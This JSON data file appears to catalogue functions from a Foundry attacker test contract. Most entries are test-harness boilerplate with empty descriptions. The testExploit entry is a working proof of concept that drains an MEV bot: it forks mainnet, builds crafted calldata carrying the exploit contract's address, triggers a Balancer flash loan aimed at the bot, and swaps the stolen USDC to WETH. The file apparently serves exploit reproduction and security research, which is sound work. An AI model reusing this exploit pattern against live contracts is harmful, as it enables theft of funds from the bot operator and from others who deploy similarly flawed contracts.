[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "getReserves",
    "original_code": "    function getReserves() external view returns (uint112, uint112, uint32) {\n        return WETH_USDC_PAIR_SUSHI.getReserves();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 15_741_332);\n        // Adding labels to improve stack traces' readability\n        vm.label(address(WETH_TOKEN), \"WETH_TOKEN\");\n        vm.label(address(USDC_TOKEN), \"USDC_TOKEN\");\n        vm.label(address(BALANCER_VAULT), \"BALANCER_VAULT\");\n        vm.label(MEV_BOT, \"MEV_BOT\");\n        vm.label(EXPLOIT_CONTRACT, \"EXPLOIT_CONTRACT\");\n        vm.label(address(WETH_USDC_PAIR_SUSHI), \"WETH_USDC_PAIR_SUSHI\");\n        vm.label(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8, \"WETH_USDC_POOL_2\");\n        vm.label(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640, \"WETH_USDC_POOL_3\");\n        vm.label(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc, \"WETH_USDC_PAIR_V2\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "swap",
    "original_code": "    function swap(uint256, uint256, address, bytes calldata) external pure {\n        return;\n    }\n\n    /**\n     * Auxiliary function to swap all USDC to WETH\n     */\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"\\n[Start] Attacker WETH balance before exploit\", WETH_TOKEN.balanceOf(address(this)), 18\n        );\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH_TOKEN);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 1;\n        // Not really know how this byte calldata works\n        bytes memory userData = bytes.concat(\n            abi.encode(\n                0x0000000000000000000000000000000000000000000000000000000000000080,\n                0x0000000000000000000000000000000000000000000000000000000000000100,\n                0x0000000000000000000000000000000000000000000000000000000000000280,\n                0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a551,\n                0x0000000000000000000000000000000000000000000000000000000000000003,\n                address(WETH_TOKEN),\n                address(USDC_TOKEN),\n                address(WETH_TOKEN),\n                0x0000000000000000000000000000000000000000000000000000000000000002,\n                0x0000000000000000000000000000000000000000000000000000000000000040,\n                0x00000000000000000000000000000000000000000000000000000000000000c0\n            ),\n            abi.encode(\n                0x0000000000000000000000000000000000000000000000000000000000000060,\n                0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a,\n                0x2e9eb0ce3606eb48000000000000000000000000000000000000000000000000,\n                0x0000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f5640,\n                0x0000000000000000000000000000000000000000000000000000000000000064,\n                0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f,\n                0x27ead9083c756cc2000000000000000000000000000000000000000000000000,\n                // original: 0x000000000000003d539801af4b77c789fa35b54dacb5f6bb2daaa01554299d6c,\n                // 3d539801af + address(EXPLOIT_CONTRACT)\n                // PoC: 0x000000000000003d539801af7FA9385bE102ac3EAc297483Dd6233D62b3e1496\n                // 3d539801af + address(EXPLOIT_CONTRACT)\n                0x000000000000003d539801af7FA9385bE102ac3EAc297483Dd6233D62b3e1496,\n                0x26f2000000000000000000000000000000000000000000000000000000000000,\n                0x0000000000000000000000000000000000000000000000000000000000000002,\n                0x0000000000000000000000000000000000000000000000000000000000000008,\n                0x0000000000000000000000000000000000000000000000000000000000000000\n            )\n        );\n        BALANCER_VAULT.flashLoan(MEV_BOT, tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\n            \"\\tAttacker USDC balance during the exploit...\", USDC_TOKEN.balanceOf(address(this)), 6\n        );\n\n        // Exchanging all USDC for WETH\n        USDC_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);\n        _USDCToWETH();\n\n        emit log_named_decimal_uint(\n            \"\\n[End] Attacker WETH balance after exploit\", WETH_TOKEN.balanceOf(address(this)), 18\n        );\n    }\n\n",
    "description": ""
  }
]